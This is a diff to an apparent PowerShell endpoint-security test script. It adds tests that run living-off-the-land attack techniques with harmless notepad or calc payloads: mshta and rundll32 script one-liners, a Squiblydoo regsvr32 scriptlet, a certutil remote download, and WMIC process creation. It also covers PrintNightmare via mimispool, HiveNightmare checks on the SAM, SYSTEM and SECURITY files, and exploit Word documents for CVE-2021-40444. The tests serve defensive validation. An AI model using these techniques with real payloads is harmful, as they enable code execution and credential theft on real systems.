@@ -15,11 +15,12 @@ Prerequisites = Windows 10, OFfice, valid Microsoft 365 login, endpoint security
 
 #>
 
-## Variables
+#Region Variables
 $systemmessagecolor = "cyan"
 $processmessagecolor = "green"
 $errormessagecolor = "red"
 $warningmessagecolor = "yellow"
+#EndRegion Variables
 
 function displaymenu($mitems) {
     $mitems += [PSCustomObject]@{
@@ -36,7 +37,7 @@ function displaymenu($mitems) {
     }
     $mitems += [PSCustomObject]@{
         Number = 4;
-        Test = "Attempt LSSASS process dump"
+        Test = "Attempt LSASS process dump"
     }
     $mitems += [PSCustomObject]@{
         Number = 5;
@@ -118,6 +119,42 @@ function displaymenu($mitems) {
         Number = 24;
         Test = "Check Windows Defender Configuration"
     }
+    $mitems += [PSCustomObject]@{
+        Number = 25;
+        Test = "Check MSHTA script launch"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 26;
+        Test = "Squiblydoo attack"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 27;
+        Test = "Block Certutil download"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 28;
+        Test = "Block WMIC process launch"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 29;
+        Test = "Block RUNDLL32 process launch"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 30;
+        Test = "PrintNightmare/Mimispool"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 31;
+        Test = "HiveNightmare/CVE-2021-36934"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 32;
+        Test = "MSHTML/CVE-2021-40444"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 33;
+        Test = "Forms 2.0 HTML controls"
+    }
     return $mitems
 }
 
@@ -180,17 +217,17 @@ function createfile(){
     else {
         write-host -foregroundcolor $errormessagecolor "`nEICAR file creation not detected - test FAILED"
     }
-    $crdtect = $true
+    $crdetect = $true
     try {
         $fileproperty = get-itemproperty .\eicar1.com.txt
     }
     catch {
         write-host -foregroundcolor $processmessagecolor "eicar1.com.txt file not detected - test SUCCEEDED"
-        $crdtect = $false
+        $crdetect = $false
     }
     if ($crdetect) {
         if ($fileproperty.Length -eq 0) {
-            write-host -foregroundcolor $processmessagecolor "eicar1.com.txt detected with file size = 0 - test SUUCCEEDED"
+            write-host -foregroundcolor $processmessagecolor "eicar1.com.txt detected with file size = 0 - test SUCCEEDED"
             write-host -foregroundcolor $processmessagecolor "Removing file .\EICAR1.COM.TXT"
             Remove-Item .\eicar1.com.txt
         }
@@ -232,9 +269,14 @@ function processdump() {
     $procdump = $true
     if (-not $result) {
         write-host -foregroundcolor $warningmessagecolor "SysInternals procdump.exe not found in current directory"
-        do {
-            $result = Read-host -prompt "Download SysInternals procdump (Y/N)?"
-        } until (-not [string]::isnullorempty($result))
+        if ($noprompt) {        # if running the script with no prompting
+            do {
+                $result = Read-host -prompt "Download SysInternals procdump (Y/N)?"
+            } until (-not [string]::isnullorempty($result))
+        }
+        else {
+            $result = 'Y'
+        }
         if ($result -eq 'Y' -or $result -eq 'y') {
             write-host -foregroundcolor $processmessagecolor "Download procdump.zip to current directory"
             invoke-webrequest -uri https://download.sysinternals.com/files/Procdump.zip -outfile .\procdump.zip
@@ -848,6 +890,277 @@ function defenderstatus() {
     } 
 }
 
+function mshta() {
+    
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 25. Block MSHTA process launching ---"
+
+$body = @"
+"about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""notepad.exe"""))</script>'"
+"@
+
+    try {
+        $error.Clear()      # Clear any existing errors
+        start-process -filepath "mshta.exe" -argumentlist $body -ErrorAction Continue
+    }
+    catch {
+        write-host -foregroundcolor $processmessagecolor "Execution error detected:"
+        write-host "    ",($error[0].exception)
+    }
+    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD has executed, then the test has FAILED`n"
+    pause
+}
+
+function squiblydoo() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 26. Squiblydoo attack ---"
+    write-host -foregroundcolor $processmessagecolor "Create SC.SCT file in current directory"
+$body1 = @"
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="TESTING" classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
+<script language="JScript">
+"@
+$body2 = @"
+<![CDATA[
+var foo = new ActiveXObject("WScript.Shell").Run("notepad.exe");]]>
+</script>
+</registration>
+</scriptlet>
+"@
+    
+    $body = -join($body1,$body2)
+    set-content -Path .\sc.sct $body
+    write-host -foregroundcolor $processmessagecolor "Execute regsvr32.exe in current directory"
+    start-process -filepath "regsvr32.exe" -argumentlist "/s /n /u /i:sc.sct scrobj.dll"
+    write-host -foregroundcolor $warningmessagecolor "If NOTEPAD is executed, then the test has FAILED`n"
+    pause
+    write-host -foregroundcolor $processmessagecolor "Delete SC.SCT"
+    remove-item .\sc.sct  
+}
+
+function certutil() {
+    
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 27. Block Certutil download ---"
+    write-host -foregroundcolor $processmessagecolor "Use CERTUTIL.EXE to download puty.exe in current directory"
+    $opt = "-urlcache -split -f https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe putty.exe"
+    try {
+        start-process "certutil.exe" -ArgumentList $opt -ErrorAction continue| Out-Null
+    }
+    catch {}
+    write-host -foregroundcolor $processmessagecolor "Check for PUTTY.EXE in current directory"
+    $result = test-path ".\putty.exe"
+    if ($result) {
+        write-host -foregroundcolor $errormessagecolor "PUTTY.EXE found - test FAILED`n"
+        write-host -foregroundcolor $processmessagecolor "Delete PUTTY.EXE"
+        remove-item .\putty.exe
+    }
+    else {
+        write-host -foregroundcolor $processmessagecolor "PUTTY.EXE not found - test SUCCEEDED`n"
+    }     
+}
+
+function wmic() {
+    
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 28. Block WMIC process launch ---"
+
+    $opt = "process call create notepad"
+    try {
+        start-process -filepath "wmic.exe" -argumentlist $opt -ErrorAction Continue
+    }
+    catch {
+    }
+    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD has executed, then the test has FAILED`n"
+    pause
+}
+
+function rundll() {
+    
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 29. Block RUNDLL32 process launch ---"
+
+$body = @"
+javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"notepad\");window.close()");
+"@
+    try {
+        start-process -filepath "rundll32" -argumentlist $body -ErrorAction Continue
+    }
+    catch {
+    }
+    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD has executed, then the test has FAILED`n"
+    pause
+}
+
+function mimispool () {
+    # Reference - https://github.com/gentilkiwi/mimikatz/tree/master/mimispool#readme
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 30. PrintNightmare / Mimispool ---"
+
+    $install = $true
+    $serverName  = 'printnightmare.gentilkiwi.com'
+    $username    = 'gentilguest'
+    $password    = 'password'
+    $printerName = 'Kiwi Legit Printer'
+    $system32        = $env:systemroot + '\system32'
+    $drivers         = $system32 + '\spool\drivers'
+
+    $fullprinterName = '\\' + $serverName + '\' + $printerName
+    $credential = (New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString -AsPlainText -String $password -Force)))
+    write-host -foregroundcolor $warningmessagecolor "*** WARNING - This process will install a test printer driver and associated files"
+    write-host -foregroundcolor $processmessagecolor "Removing existing test printer if present"
+    Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
+    Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
+    write-host -foregroundcolor $processmessagecolor "Creating new",$printerName
+    New-PSDrive -Name 'KiwiLegitPrintServer' -Root ('\\' + $serverName + '\print$') -PSProvider FileSystem -Credential $credential | Out-Null
+    try {
+        Add-Printer -ConnectionName $fullprinterName -ErrorAction stop
+    } 
+    catch {
+        write-host -foregroundcolor $processmessagecolor "Unable to install printer - test SUCCESSFUL"
+        $install=$false
+        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
+    }
+    write-host -foregroundcolor $warningmessagecolor "`nIf an administrator command prompt appears, then the test has FAILED`n"
+    pause
+
+    if ($install) {
+        write-host -foregroundcolor $errormessagecolor "`nAble in install printer - test FAILED"
+        $driver = (Get-Printer -Name $fullprinterName).DriverName
+        write-host -foregroundcolor $processmessagecolor "Remove printer",$printerName
+        Remove-Printer -Name $fullprinterName
+        start-sleep -Seconds 3
+        write-host -foregroundcolor $processmessagecolor "Remove printer driver",$driver
+        Remove-PrinterDriver -Name $driver
+        write-host -foregroundcolor $processmessagecolor "Remove mapping`n"
+        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer'
+        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+        If ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+            write-host -foregroundcolor $processmessagecolor "Running as an Administrator detected`n"
+            if (test-path($drivers  + '\x64\3\mimispool.dll')) {
+                write-host -foregroundcolor $processmessagecolor "Deleting ",($drivers  + '\x64\3\mimispool.dll')
+                Remove-Item -Force -Path ($drivers  + '\x64\3\mimispool.dll')
+            }
+            if (test-path($drivers  + '\W32X86\3\mimispool.dll')) {
+                write-host -foregroundcolor $processmessagecolor "Deleting ",($drivers  + '\W32X86\3\mimispool.dll')
+                Remove-Item -Force -Path ($drivers  + '\W32X86\3\mimispool.dll')
+            }
+            if (test-path($system32 + '\mimispool.dll')) {
+                write-host -foregroundcolor $processmessagecolor "Deleting ",($system32 + '\mimispool.dll')
+                Remove-Item -Force -Path ($system32 + '\mimispool.dll')
+            }
+        }
+        else {
+            write-host -foregroundcolor $warningmessagecolor "Not Running as an Administrator. Manual clean up required`n"
+            if (test-path($drivers  + '\x64\3\mimispool.dll')) {
+                write-host -foregroundcolor $errormessagecolor "***",($drivers  + '\x64\3\mimispool.dll')"Should be removed by an administrator"
+            }
+            if (test-path($drivers  + '\W32X86\3\mimispool.dll')) {
+                write-host -foregroundcolor $errormessagecolor "***",($drivers  + '\W32X86\3\mimispool.dll')"Should be removed by an administrator"
+            }
+            if (test-path($system32 + '\mimispool.dll')) {
+                write-host -foregroundcolor $errormessagecolor "***",($system32 + '\mimispool.dll')"Should be removed by an administrator"
+            }
+        }
+    }
+}
+
+function hivevul () {
+    # Reference - https://github.com/JoranSlingerland/CVE-2021-36934/blob/main/CVE-2021-36934.ps1
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 31. HiveNightmare / CVE-2021-36934 ---"
+    $samaccess = $true
+    $systemaccess = $true
+    $securityaccess = $true
+    $systempath = $env:windir
+    $LocalUsersGroup = Get-LocalGroup -SID 'S-1-5-32-545'
+    try {
+        $tryaccess = test-path($systempath+"\system32\config\sam") -ErrorAction stop
+    }
+    catch {
+        $samaccess = $false
+    }
+    if ($samaccess) {
+        write-host -foregroundcolor $processmessagecolor -nonewline "SAM Path exists - "
+        $checkPermissions = Get-Acl $env:windir\System32\Config\sam
+        if ($LocalUsersGroup) {
+            if ($CheckPermissions.Access.IdentityReference -match $LocalUsersGroup.Name) {
+                write-host -foregroundcolor $errormessagecolor "SAM Path vulnerable"
+            }
+            else {
+                write-host -foregroundcolor $processmessagecolor "SAM Path not vulnerable"
+            }
+        }
+    }
+    else {
+        write-host -foregroundcolor $warningmessagecolor "SYSTEM Path does not exists or cannot be accessed"
+    }
+    try {
+        $tryaccess = test-path($systempath+"\system32\config\system") -ErrorAction stop
+    }
+    catch {
+        $systemaccess = $false
+    }
+    if ($systemaccess) {
+        write-host -foregroundcolor $processmessagecolor -nonewline "SYSTEM Path exists - "
+        $checkPermissions = Get-Acl $env:windir\System32\Config\system
+        if ($LocalUsersGroup) {
+            if ($CheckPermissions.Access.IdentityReference -match $LocalUsersGroup.Name) {
+                write-host -foregroundcolor $errormessagecolor "SYSTEM Path vulnerable"
+            }
+            else {
+                write-host -foregroundcolor $processmessagecolor "SYSTEM Path not vulnerable"
+            }
+        }
+    }
+    else {
+        write-host -foregroundcolor $warningmessagecolor "SYSTEM Path does not exists or cannot be accessed"
+    }
+    try {
+        $tryaccess = test-path($systempath+"\system32\config\security") -ErrorAction stop
+    }
+    catch {
+        $securityaccess = $false
+    }
+    if ($securityaccess) {
+        write-host -foregroundcolor $processmessagecolor -nonewline "SECURITY Path exists - "
+        $checkPermissions = Get-Acl $env:windir\System32\Config\security
+        if ($LocalUsersGroup) {
+            if ($CheckPermissions.Access.IdentityReference -match $LocalUsersGroup.Name) {
+                write-host -foregroundcolor $errormessagecolor "SECURITY Path vulnerable"
+            }
+            else {
+                write-host -foregroundcolor $processmessagecolor "SECURITY Path not vulnerable"
+            }
+        }
+    }
+    else {
+        write-host -foregroundcolor $warningmessagecolor "SECURITY Path does not exists or cannot be accessed"
+    }
+}
+
+function mshtmlvul() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 32. MSHTML remote code execution ---"
+    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
+    Invoke-WebRequest -Uri https://github.com/directorcia/Office365/raw/master/example/WebBrowser.docx -OutFile .\webbrowser.docx
+    write-host -foregroundcolor $processmessagecolor "Open document using Word"
+    Start-Process winword.exe -ArgumentList ".\webbrowser.docx"
+    write-host "`n1. Click on the Totally Safe.txt embedded item at top of document"
+    write-host "2. Ensure that CALC.exe cannot be run in any way" 
+    write-host "3. Close Word once complete.`n"
+    pause
+    write-host -foregroundcolor $processmessagecolor "`nDelete webbrowser.docx"
+    remove-item .\webbrowser.docx  
+}
+
+function formshtml() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 33. Forms HTML controls remote code execution ---"
+    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
+    Invoke-WebRequest -Uri https://github.com/directorcia/Office365/raw/master/example/Forms.HTML.docx -OutFile .\forms.html.docx
+    write-host -foregroundcolor $processmessagecolor "Open document using Word"
+    Start-Process winword.exe -ArgumentList ".\forms.html.docx"
+    write-host "`n1. Click on the embedded item at top of document"
+    write-host "2. Ensure that CALC.exe cannot be run in any way" 
+    write-host "3. Close Word once complete.`n"
+    pause
+    write-host -foregroundcolor $processmessagecolor "`nDelete forms.html.docx"
+    remove-item .\forms.html.docx  
+}
+
 <#          Main                #>
 Clear-Host
 if ($debug) {       # If -debug command line option specified record log file in parent
@@ -909,6 +1222,15 @@ switch ($results.number) {
     22  {blockatfirst}
     23  {servicescheck}  
     24  {defenderstatus}
+    25  {mshta}
+    26  {squiblydoo}
+    27  {certutil}
+    28  {wmic}
+    29  {rundll}
+    30  {mimispool}
+    31  {hivevul}
+    32  {mshtmlvul}
+    33  {formshtml}
 }
 
 write-host -foregroundcolor $systemmessagecolor "`nSecurity test script completed"
